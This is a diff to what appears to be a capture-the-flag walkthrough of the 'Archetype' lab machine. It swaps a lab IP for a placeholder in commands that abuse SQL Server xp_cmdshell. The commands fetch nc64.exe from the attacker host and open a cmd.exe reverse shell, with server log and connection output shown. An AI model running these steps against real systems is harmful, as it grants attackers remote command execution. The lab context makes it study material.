@@ -189,7 +189,7 @@ Host the "nc64.exe" file on the HTTP server.
 Execute the shell by downloading and running the "nc64.exe" file on the target machine.
 
 ```
-SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads ; wget http://10.10.14.172/nc64.exe -outfile nc64.exe ';
+SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads ; wget http://<MY IP ADRESS>/nc64.exe -outfile nc64.exe ';
 output   
 ------   
 NULL     
@@ -197,7 +197,7 @@ NULL
 ```
 10.129.207.19 - - [01/Oct/2023 11:35:21] "GET /nc64.exe HTTP/1.1" 200 -
 
-SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads ; .\nc64.exe -e cmd.exe 10.10.14.172 443';
+SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads ; .\nc64.exe -e cmd.exe <MY IP ADRESS> 443';
 ```
 ```
 connect to [10.10.14.172] from (UNKNOWN) [10.129.207.19] 49678
